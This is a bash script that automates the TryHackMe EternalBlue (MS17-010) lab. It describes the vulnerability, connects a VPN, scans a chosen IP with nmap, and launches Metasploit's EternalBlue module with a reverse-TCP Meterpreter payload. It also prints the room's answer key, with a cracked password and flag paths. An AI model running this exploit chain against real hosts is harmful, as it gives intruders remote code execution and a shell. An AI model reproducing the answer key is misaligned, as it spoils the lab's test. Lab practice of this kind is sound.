#!/bin/bash

# ---------------------------------------------
# EternalBlue Lab Automation Script (TryHackMe)
# Author: For Educational Use Only
# ---------------------------------------------

# 💙 General Banner
show_banner() {
    echo -e "\n\033[1;34m"
    echo "██████▄ ██│     ██│   ██│██████▄"
    echo "██╌╌██│██│     ██│   ██│██╌╌╌╌██"
    echo "██████│██│     ██│   ██│█████▄  "
    echo "██╌╌╌╌│ ██│     ██│   ██│██╌╌╌╌  "
    echo "██│     ██████▄┬═█████▄┬██████▄"
    echo "╌╌│     ╌╌╌╌╌╌╌╌ ╌╌╌╌╌╌╌╌ ╌╌╌╌╌╌╌"
    echo "       🧠 TryHackMe – EternalBlue"
    echo -e "\033[0m"
}

# 🧠 Description Banner
banner_description() {
    echo -e "\n\033[1;36m==[ LAB DESCRIPTION ]==\033[0m"
}

# 📋 Tasks Banner
banner_tasks() {
    echo -e "\n\033[1;35m==[ TASK CHECKLIST ]==\033[0m"
}

# 🔌 VPN Banner
banner_vpn() {
    echo -e "\n\033[1;32m==[ VPN CONNECTION ]==\033[0m"
}

# ⚔️ Exploit Banner
banner_exploit() {
    echo -e "\n\033[1;31m==[ EXPLOITATION LAB ]==\033[0m"
}

# 📖 Answer Banner
banner_answers() {
    echo -e "\n\033[1;33m==[ QUESTIONS & ANSWERS ]==\033[0m"
}

# ---------------------------------------------

# 🧠 Lab description
show_description() {
    banner_description
clear
echo "========================================="
echo "     💣 TRYHACKME: ETERNALBLUE LAB       "
echo "========================================="
sleep 2

echo ""
echo "📖 Background:"
echo "-----------------------------------------"
echo "EternalBlue (MS17-010) is a vulnerability"
echo "in Microsoft SMBv1 protocol, discovered in"
echo "2017 and leaked by a group called Shadow Brokers."
echo "It was weaponized by the NSA (tool: EternalBlue)."
echo ""
sleep 5

echo "⚠️  Impact:"
echo "-----------------------------------------"
echo "- Allowed attackers to execute remote code"
echo "- Led to massive ransomware attacks like WannaCry"
echo "- Affects Windows XP to Windows 8.1 and Server 2008"
echo ""
sleep 5

echo "🎯 Purpose of This Lab:"
echo "-----------------------------------------"
echo "You will:"
echo "- Scan a vulnerable machine"
echo "- Detect open SMB ports"
echo "- Identify the MS17-010 vulnerability"
echo "- Exploit it using Metasploit"
echo "- Gain a Meterpreter shell"
echo "- Capture system flags"
echo ""
sleep 6

echo "🛠️  Tools You'll Use:"
echo "-----------------------------------------"
echo "- Nmap (for scanning)"
echo "- smb-vuln-ms17-010 NSE script"
echo "- Metasploit Framework"
echo "- Windows post-exploitation commands"
echo ""
sleep 5

echo "🚀 Learning Objectives:"
echo "-----------------------------------------"
echo "1. Understand what EternalBlue is"
echo "2. Learn how to scan for vulnerable SMB ports"
echo "3. Exploit a system with Metasploit"
echo "4. Practice post-exploitation techniques"
echo ""
sleep 5

echo "🔐 Why is it important?"
echo "-----------------------------------------"
echo "Because EternalBlue shows how a single unpatched"
echo "bug in a service (SMB) can bring down thousands"
echo "of systems globally."
echo ""
sleep 4

echo "🧠 Ethical Reminder:"
echo "-----------------------------------------"
echo "This lab is for educational use only!"
echo "Never scan or exploit machines you don't own"
echo "or have explicit permission to test."
echo ""
sleep 4

echo "✅ You're ready to start the lab!"
echo "-----------------------------------------"
echo "1. Connect to VPN"
echo "2. Scan with Nmap"
echo "3. Use Metasploit's eternalblue module"
echo "4. Capture the flag"
echo ""
sleep 3

echo "🖱️  Tip: Use 'nmap -p 445 --script smb-vuln* <IP>'"
echo "       and 'msfconsole' to launch your exploit"
echo ""

echo "========================================="
echo "     ✅ END OF ETERNALBLUE INTRO         "
echo "========================================="

}

# 📋 Lab task checklist
show_tasks() {
    banner_tasks
    echo "1. Connect to TryHackMe VPN"
    echo "2. Discover target machine"
    echo "3. Scan with Nmap"
    echo "4. Identify MS17-010 vulnerability"
    echo "5. Exploit using Metasploit"
    echo "6. Convert shell to Meterpreter"
    echo "7. Dump and crack hashes"
    echo "8. Find the flags "
}

# 🔌 VPN connection only
connect_vpn() {
    banner_vpn
    echo "[*] Searching for available .ovpn files in ~/Downloads..."
    mapfile -t vpn_files < <(find ~/Downloads -name "*.ovpn")
    if [[ ${#vpn_files[@]} -eq 0 ]]; then
        echo "[!] No .ovpn files found in ~/Downloads"
        return
    fi
    echo "Available VPN Profiles:"
    select vpnfile in "${vpn_files[@]}"; do
        if [[ -n "$vpnfile" ]]; then
            echo "[+] Starting VPN with: $vpnfile"
            sudo openvpn --config "$vpnfile"
            break
        else
            echo "[!] Invalid selection."
        fi
    done
}

# ⚔️ Full exploitation flow
exploit_lab() {
    banner_exploit
    echo "[*] Searching for available .ovpn files in ~/Downloads..."
    mapfile -t vpn_files < <(find ~/Downloads -name "*.ovpn")
    if [[ ${#vpn_files[@]} -eq 0 ]]; then
        echo "[!] No .ovpn files found in ~/Downloads"
        return
    fi
    echo "Available VPN Profiles:"
    select vpnfile in "${vpn_files[@]}"; do
        if [[ -n "$vpnfile" ]]; then
            echo "[+] Connecting VPN in background using: $vpnfile"
            sudo openvpn --config "$vpnfile" &
            break
        else
            echo "[!] Invalid selection."
        fi
    done

    sleep 10
    echo "[i] VPN started. Detecting LHOST IP..."
    lhost=$(ip -4 addr show tun0 | grep inet | awk '{print $2}' | cut -d/ -f1)
    echo "[+] Detected LHOST: $lhost"

    read -p "[?] Enter Target IP (RHOST): " rhost
    read -p "[?] Enter Listening Port (LPORT, default 4444): " lport
    lport=${lport:-4444}

    echo "[+] Running Nmap basic scan..."
    nmap -sS -sV -O -Pn "$rhost" -oN initial_scan.txt

    echo "[+] Running Nmap vulnerability scan..."
    nmap -sV --script vuln "$rhost" -oN vuln_scan.txt

    mkdir -p reports
    echo "--- EternalBlue Report ---" > reports/eternalblue_report.txt
    echo "Date: $(date)" >> reports/eternalblue_report.txt
    echo "Target: $rhost" >> reports/eternalblue_report.txt
    echo "LHOST: $lhost" >> reports/eternalblue_report.txt
    echo -e "\n--- Nmap Scan ---\n" >> reports/eternalblue_report.txt
    cat initial_scan.txt >> reports/eternalblue_report.txt
    echo -e "\n--- Vuln Scan ---\n" >> reports/eternalblue_report.txt
    cat vuln_scan.txt >> reports/eternalblue_report.txt

    echo "[i] Scans saved as 'initial_scan.txt', 'vuln_scan.txt', and 'reports/eternalblue_report.txt'."
    read -p "[*] Press Enter to launch EternalBlue exploit..."

    msfconsole -q -x "
use exploit/windows/smb/ms17_010_eternalblue;
set RHOSTS $rhost;
set LHOST $lhost;
set LPORT $lport;
set PAYLOAD windows/x64/meterpreter/reverse_tcp;
exploit;
exit;"
}

# 📖 Lab Q&A section
show_answers() {
    banner_answers
    echo "🔹 How many ports under 1000 are open?"
    echo "➡️  3"
    echo "🔹 Vulnerable to?"
    echo "➡️  ms17-010"
    echo "🔹 Exploit path?"
    echo "➡️  exploit/windows/smb/ms17_010_eternalblue"
    echo "🔹 Required option name?"
    echo "➡️  RHOSTS"
    echo "🔹 Shell-to-Meterpreter module?"
    echo "➡️  post/multi/manage/shell_to_meterpreter"
    echo "🔹 Required post module option?"
    echo "➡️  SESSION"
    echo "🔹 Non-default user?"
    echo "➡️  jon"
    echo "🔹 Cracked password?"
    echo "➡️  alqfna22"
    echo "🔹 Flag1:"
    echo "➡️  C:\\flag1.txt"
    echo "🔹 Flag2:"
    echo "➡️  C:\\Windows\\System32\\config\\flag2.txt"
    echo "🔹 Flag3:"
    echo "➡️  C:\\Users\\Administrator\\Documents\\flag3.txt"
}

# 🧱 Main menu loop
while true; do
    show_banner
    echo "--------------------------------------------"
    echo "1. View Lab Description"
    echo "2. View Task Checklist"
    echo "3. Connect to VPN Only"
    echo "4. Start Exploitation Lab"
    echo "5. View Lab Questions and Answers"
    echo "6. Exit"
    echo "--------------------------------------------"
    read -p "[*] Choose an option [1-6]: " choice

    case $choice in
        1) show_description ;;
        2) show_tasks ;;
        3) connect_vpn ;;
        4) exploit_lab ;;
        5) show_answers ;;
        6) echo "[✓] Goodbye!"; exit 0 ;;
        *) echo "[!] Invalid option. Please enter 1–6." ;;
    esac
done
